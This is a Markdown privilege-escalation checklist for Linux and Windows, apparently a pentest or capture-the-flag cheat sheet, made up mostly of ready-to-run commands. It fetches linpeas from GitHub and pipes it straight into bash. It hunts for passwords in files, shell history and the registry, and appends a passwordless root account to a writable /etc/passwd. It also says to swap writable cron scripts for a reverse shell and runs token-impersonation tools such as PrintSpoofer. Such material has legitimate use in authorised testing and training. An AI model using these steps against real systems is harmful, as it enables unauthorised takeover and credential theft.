# ⬆️ Privilege Escalation Checklist

Run these in order. Stop when you find something.

---

## 0. Auto-Enumerate First

```bash
# Linux
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Windows
# Upload winpeas.exe, then run it
```

---

## Linux Checklist

### 1. Who am I?
```bash
id; whoami; groups
```

### 2. Sudo permissions
```bash
sudo -l
# → Look for NOPASSWD entries → google "GTFOBins <binary>"
```

### 3. SUID binaries
```bash
find / -perm -4000 2>/dev/null
# → Check each at gtfobins.github.io
```

### 4. Cron jobs
```bash
cat /etc/crontab
ls /etc/cron.d/
crontab -l
# → Writable script? → replace with reverse shell
```

### 5. Writable files owned by root
```bash
find / -writable -user root 2>/dev/null | grep -v proc
```

### 6. Kernel version → known exploits
```bash
uname -r
# → searchsploit "Linux Kernel X.X" or Google CVE
```

### 7. Capabilities
```bash
getcap -r / 2>/dev/null
# → cap_setuid = instant root
```

### 8. Passwords in files
```bash
grep -r "password" /etc/ /var/ /home/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
cat ~/.bash_history
env
```

### 9. Writable /etc/passwd
```bash
ls -la /etc/passwd
# If writable: echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
# then: su root2
```

### 10. Internal ports / services
```bash
ss -tulpn
# → Port open only internally? → exploit locally
```

---

## Windows Checklist

### 1. Who am I?
```cmd
whoami /all
net user %username%
```

### 2. Unquoted service paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

### 3. Weak service permissions
```cmd
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
```

### 4. AlwaysInstallElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 1 → instant SYSTEM via .msi exploit
```

### 5. Stored credentials
```cmd
cmdkey /list
# → runas /savecred /user:admin cmd.exe
```

### 6. Token impersonation
```
# If SeImpersonatePrivilege → run PrintSpoofer or GodPotato
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

### 7. Passwords in common places
```cmd
findstr /si "password" *.xml *.ini *.txt *.config
reg query HKLM /f password /t REG_SZ /s
```

---

## Key Resources

- [GTFOBins](https://gtfobins.github.io/) — Linux SUID/sudo exploits
- [LOLBAS](https://lolbas-project.github.io/) — Windows living-off-the-land
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — everything
